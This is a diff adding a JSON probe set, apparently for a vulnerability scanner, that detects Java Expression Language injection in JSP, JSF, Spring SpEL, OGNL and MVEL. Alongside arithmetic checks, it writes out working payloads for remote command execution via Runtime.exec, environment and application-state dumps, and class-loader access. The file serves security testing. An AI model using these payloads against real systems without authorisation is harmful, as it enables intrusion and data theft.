@@ -1,0 +1,145 @@
+{
+  "category": "expression_language_injection",
+  "description": "Java Expression Language injection — JSP EL, JSF EL, Spring SpEL, OGNL in non-Struts contexts, MVEL, JBoss EL",
+  "severity": "critical",
+  "references": [
+    "https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection",
+    "https://cwe.mitre.org/data/definitions/917.html"
+  ],
+  "contexts": {
+    "jsp_el_arithmetic": {
+      "description": "JSP/JSF Unified EL arithmetic evaluation — ${} and #{} syntax",
+      "tech_match": ["java", "jsp", "jsf", "tomcat", "wildfly", "jboss", "glassfish"],
+      "probes": [
+        {
+          "payload": "${7*7}",
+          "description": "Basic JSP EL arithmetic. If the response contains 49, the server evaluates ${} expressions.",
+          "matchers": [
+            {"type": "word", "value": ["49"]}
+          ]
+        },
+        {
+          "payload": "#{7*7}",
+          "description": "JSF deferred EL arithmetic. If 49 appears, the server evaluates #{} expressions.",
+          "matchers": [
+            {"type": "word", "value": ["49"]}
+          ]
+        },
+        {
+          "payload": "${7*7}a]]}zx",
+          "description": "EL with trailing garbage to distinguish real evaluation from static reflection. Only 49 appears if evaluated.",
+          "matchers": [
+            {"type": "word", "value": ["49a]]}zx"]}
+          ]
+        }
+      ]
+    },
+    "jsp_el_class_access": {
+      "description": "JSP EL class access via applicationScope or pageContext for information disclosure",
+      "tech_match": ["java", "jsp", "tomcat", "wildfly", "jboss"],
+      "probes": [
+        {
+          "payload": "${applicationScope}",
+          "description": "Dump application scope. If the server returns a Map dump, EL injection exists with read access to application state.",
+          "matchers": [
+            {"type": "word", "value": ["{", "=", "javax"]}
+          ]
+        },
+        {
+          "payload": "${pageContext.request.serverName}",
+          "description": "Extract server hostname via pageContext. Confirms EL injection with property traversal.",
+          "matchers": [
+            {"type": "word_absent", "value": ["${pageContext"]}
+          ]
+        },
+        {
+          "payload": "${pageContext.servletContext.classLoader}",
+          "description": "Access class loader via EL. A non-error response confirms deep object graph traversal.",
+          "matchers": [
+            {"type": "word", "value": ["ClassLoader", "WebappClassLoader", "URLClassLoader"]}
+          ]
+        }
+      ]
+    },
+    "spring_spel": {
+      "description": "Spring Expression Language (SpEL) injection via T() type expressions",
+      "tech_match": ["spring", "spring-boot", "spring-mvc", "java"],
+      "probes": [
+        {
+          "payload": "${T(java.lang.Math).random()}",
+          "description": "SpEL type expression calling Math.random(). A decimal number in the response proves SpEL evaluation.",
+          "matchers": [
+            {"type": "regex", "value": "0\\.\\d+"}
+          ]
+        },
+        {
+          "payload": "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+          "description": "SpEL RCE via Runtime.exec(). Do NOT use this in production — listed for detection of the injection point only. Match on the Process object reference or error.",
+          "matchers": [
+            {"type": "word", "value": ["Process", "UNIXProcess", "ProcessImpl"]}
+          ]
+        },
+        {
+          "payload": "${T(java.lang.System).getenv()}",
+          "description": "SpEL environment variable dump. A map of environment variables confirms SpEL evaluation with system access.",
+          "matchers": [
+            {"type": "word", "value": ["PATH=", "HOME=", "JAVA_HOME"]}
+          ]
+        }
+      ]
+    },
+    "ognl_non_struts": {
+      "description": "OGNL injection outside Apache Struts — Confluent, Atlassian products, custom OGNL evaluators",
+      "tech_match": ["confluence", "atlassian", "ognl"],
+      "probes": [
+        {
+          "payload": "%{7*7}",
+          "description": "OGNL arithmetic in %{} syntax. 49 in the response confirms OGNL evaluation.",
+          "matchers": [
+            {"type": "word", "value": ["49"]}
+          ]
+        },
+        {
+          "payload": "${#context['com.opensymphony.xwork2.dispatcher.HttpServletRequest'].getHeader('Host')}",
+          "description": "OGNL context access to read the Host header. The hostname in the response confirms deep OGNL access.",
+          "matchers": [
+            {"type": "word_absent", "value": ["${#context"]}
+          ]
+        }
+      ]
+    },
+    "mvel": {
+      "description": "MVEL expression injection — used in Drools, JBoss, Mule ESB",
+      "tech_match": ["drools", "jboss", "mule"],
+      "probes": [
+        {
+          "payload": "@{7*7}",
+          "description": "MVEL arithmetic via @{} syntax. 49 in the response confirms MVEL evaluation.",
+          "matchers": [
+            {"type": "word", "value": ["49"]}
+          ]
+        }
+      ]
+    },
+    "error_based_blind": {
+      "description": "Blind EL injection via error-based detection — trigger a parse error with malformed expression",
+      "tech_match": ["java", "jsp", "spring", "jsf"],
+      "probes": [
+        {
+          "payload": "${T(java.lang.Runtime).getRuntime().exec('sleep 5')}",
+          "description": "Time-based blind SpEL. A 5-second delay in response confirms blind SpEL evaluation.",
+          "matchers": [
+            {"type": "time_delay", "value": 5}
+          ]
+        },
+        {
+          "payload": "${''.class.forName('java.lang.Thread').sleep(5000)}",
+          "description": "Blind EL via Thread.sleep. A 5-second delay confirms evaluation.",
+          "matchers": [
+            {"type": "time_delay", "value": 5}
+          ]
+        }
+      ]
+    }
+  }
+}
